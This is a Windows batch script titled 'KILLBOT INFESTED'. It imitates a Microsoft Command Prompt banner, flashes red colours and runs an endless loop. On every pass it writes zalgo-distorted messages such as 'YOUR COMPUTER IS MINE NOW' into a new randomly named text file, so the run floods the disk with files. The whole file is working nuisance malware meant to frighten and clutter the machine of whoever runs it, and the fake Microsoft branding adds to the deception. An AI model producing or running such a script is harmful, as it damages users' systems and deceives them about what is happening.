@echo off
title KILLBOT INFESTED
echo Microsoft (c) 2022
echo Command Prompt
color 4
echo KILLBOT
:killbotflash
color 47
color 04
echo K̶̡̧͍̗̩͚̞̦̝̗̦̜̦͓̼̪̫̼͚̬̩̫̥̟͖̝͓̩̯̜͈̣̲̟͈̈́͑͂̾̈̽̈́̈́͑̈́̇͊͆̎̍̍̚͜͜͝ͅͅͅĮ̴̛̛̛͓̟̪̳̺̃͐̆͑̑̊̅̋͗͂͆͐̃̽̃́̋̓̓͛̄̎͐͗̑̊̕̕͘̕͝͝L̴̡̜̺̬̪̲͍͊́̊̍͐̐̽̃̏̂̐̀͊̓͊̀̈̔̕͝Ļ̵̢̨̢̢̢̨͕͚̮̭͓̬̬̙̫̟̲̥̻̘̰̪̣͙̭̱̗̫̳͖̗̠̠͚̻̣͙͔̻͕͈̣͎̟̽͌̔̈̎̅̇̿̓̓̈́́͘͘͘͝͝ͅͅͅB̸̛͔̱̰̲̻͍͎͉͂̓́̅̑̿̐̓́͛̿͛͊̉̐̈́̄̈́̚͜͜͜͝ͅÒ̷̧̢̢̡̟͚̰̠̪̮̖̗̼̼̦̘̻̬̳̫͕̩͎͕̻̩̖̘̩̟̭͔̙͈̮͒͐͒̾͜͜͜ͅT̸̢̨̡̨̼̼̰̱͔͇̠͇̗͎̹͓̞̣̟̗̺͙͇͗̀̍̿̌̒̐̒̈̈́͆͑̊́̃͂̏̿̋̕̚͠͝.̶̨̡̧͚̲͍͉̮̹̠̦̱̞͕̻̺̙̞͓͈̮̥̺̗͇̲̟͔͆̑̈́̄̽̊̃́̃͛̓́̂͆̓̃͒͛̽̑̌̃͐̂̐͐̈́̊̏̓̉͂̊͑̓͛̂̐̓̀̎̔̂̀̕͜͝͝͠͝ >> KILLBOT%random%.txt
echo ̴̢̢̢͖͚̮̯̖̹̞̘͕̙̼̪̲̳̣̠̤͈̭̟̫͕̜̻̖̖̂̃̐̒̋̆̐͋̽̍̓̏̾͒̽̊̓̋̑̀͆̿̏̈́̋͜͠ͅY̴̨̢̡̦̤̯̠̪̭̤̳͙̼̣̟̮̮̙̹̦̞͈̪͉̘̟̯̪͇̰̲̳̦͍̫̮͖̘̟̥̙̬̤͇̟͆̽̾̆̀̕͜͜Ơ̶̡̡̜̲̘͕̙̗̙̝̞̺͎̞͉͓͓̹̦͓͔͙̦̝͚̮̲̜̽̇͛̏͋̽͛́̔̀͒͆̓͋̃̈́͂͆̃͛͐́̒͋̌̉͗́́̽̓̓̽̃̔͐̓̑̎͑̉̚̕̚͘͜͝͝͠Ư̴̧̡̢̘̫̖̟͓̥͉̻̞̩̖̗͍̬͖̮͔͈͉͎̋̇̇̀͊͒̇̌̓̐̉̅͋̿̐͗̏̑̅̓̃̎̑͆̋͘͜͠Ř̷̹̽̍ ̶̡̘̹͚̝̹̙͇̉̽͛̏̿̓̏̔͂͛̇͂͗̉̈́͗̚͝͝͝͝͝C̶̡̢͓̜̮͕̭̜̞̯̝͔̥̺̬̩̦̳͓͔̜̯̥͉̹͋̄̒̈̆͌̿͆̑̏͗̊́͋͌̂̔̉̐͐͛̋̈̈́́̈́́̇͑̏̃͆̌̿͋̚̚͜͠ͅǪ̶̢̧̧̠̹͇̣̘̱̬̘͖̪̮̤̝̝̦͈̤̳͕̝͎̲͍̭̩͔͕̥̟͔͍͙̹̠͓͚̐͌̅́̃̎̀͑̊̓͌̓͘͜͝M̴̡̡̝̭̱̘͙̺̥̠̬̬̫̤͈̪̤̖̮͍̯̰͕̮͙̙͎͉̮͖͚̣͈̙̳̺̣͙̘̝̍͗̎̂̍̋̄̉̋̄̒̾̎̐̔͌̅̿̏̿̍͐̉̊̌́̔̀̆͛̃̂̃̄̈̒̾̽͘̚̕͝͝͠ͅṖ̴̡͕̝̙͕̝̘̺̝͇̻̲̱͍̘̲̘̺̜͍̲̲̖̱͖̮͛̓̍͋͊̑̋͂̾̐͊̄̌͋̋́̾̆̐͂͊̊̊̔͆̒̆̉͌̄̕͘̚̚͜͜͠͝͝Ų̷̲̘̘̩̬͍̠̞͍͚̗̳̙̩̱̻͈̞͕̤̗̣̜͔̥̫̻̞̟̮̜̪́̂̂̋̋̄́̆̋̊͐͗̏̓̎̃̑̈̐̊̽̆͜͜T̷̛̬̣̿͗̎͊͂̅̐͆́́̀̋̃͠É̷̛̠͖̣̦̱̰̺͔̺̯͓̠͓͔̽̌̂̈́͛͌̇͋̉̓̍̇͊͛̍͘̕͜͠͠Ŗ̵̧̛̟̩͖̲̱̭̻͇̲͉͎̗͙̝͉̝̠̮̹̹̘͉̗̺̝̃̊̀̍͗̂́̑̒̈́̊̿̓̉͘͠ ̷̢̡̢̢̫̺͕̰͈̙̮͙̱͓̳̣̤͚͈̦̪̦̭͈̘̦̱̫͔̮̯̬̯͎̱̓̒̇͜ͅĮ̷̧͇͕͉̯̫̩̭̩͎̘̺̙̲̣͓̹̳̥̩̩̝͉̬̦̰̹̈́ͅS̴̢̨̛̻͕̪̘̹̙̦̙̝̳̗̝̦̹̣͈̩͙͈͇̣̯͔͙̻̱̽̋̽̔̊͋͑͆̀̀͂́͒͋̽̓̊͘̕͜ͅ ̴̛̛̛͈̍̑͗̓̋̉͑́̒̔̿̀̃̃̄͋͂͒́̀̓̂̽͐͐̆̕͠͠Ḿ̶̡̢̢̧̧̛͇̮̖̜̜̪̻̫̘͓̣̪̥͖̜͔̪̝̻̝̳̝̫̯̝̬̣̙̘̯͍̤̟̯̯͔̖̫̹͇̯̓̽̅̀̽̓́͐̄̓̽̾̑̓͒̉̄̽͌̾͌̐̒͗͊̈́̇͋̎́̈̋͛̿̄̎͑̇̔̏̊͊̾͘͠͝ͅI̴̢̧̡̨̧̗̖̥͚̥͚̱̜̩͈̟̙͈͎̜̼̻̲͙̝̤̥͎͈̖̹̜̪͔͕͈̘̮͚͉̙̺͕̰̪͌̇̈́̿̔̄͗̓̍̓͜͜͠ͅŅ̸̢̛͔̹̬̖̩͇̯̺̜͔͚̺̤̙̩̩̺̤̠͔̣̖̦͚͕̹̣̙̻̻͉̞̝̪̄̿͊͊̈̐͌̾̋̽̍͌͊̈́̽̑̉͗͂̓̀̈́̉͑̐̀̆͊̑͛̀̆̂́̈́̈́̄̚͠͝͠͠͝ͅͅȨ̶̡̨̢͖͓̠̠͈̟͙̙̦̰͇͍̯̩̟̟͓͖̞͔̣͎̭̹̩̺̦̹̘̇͆̆̀͋̀̾̌͐̽̏̈́̀̔̄͘̕̕͜͜ ̸̡̨̢̨͉̘͎̳̼̬̩͈̘̜̩͉̭͙̦̻͙̩̝̦̩͚͓̲̣͓̤̣̻͇̤̼̹̪͉̱̲͖͙͇̲̲̦͋̾̋̐̃͗̆̐̒̀̔̑̽͐̈́̿͊̽̏͌̏͘͘͘̕͜͝͠͠ͅN̶͖̜̞̝̉̐́͊̓̓͑̂̊͐͌͘͝Ö̵̟̣͕͖̬̩̣́̓̊̋̽͆͗̽̋͠ͅW̶̛̪͉̻̝͙̜͉͇̜̲̳̰̟͊̓̃̀̈́̏̐̊̀͐̈́̍́͐͒͑̎̇̌̓̽̾́̏͂̿̕͘͘͘̕͝͝.̷̡̧̬͍͇̤̜̭̘͖̲͚͓͖̬͙̰̪̠̞̞̙͕̟͕͙͚̬̙̱͖̱̮̯̦̞̟̱̜̅͗̌̉̏͋̈̋̇̂̿̄̽̈́͋̔̆̆̑̓͊͌͂͆̀͐̈́̃͆̾̀͗̕̚͜͜͝͝͝͝͝͝ͅ>> KILLBOT%random%.txt
goto killbotflash
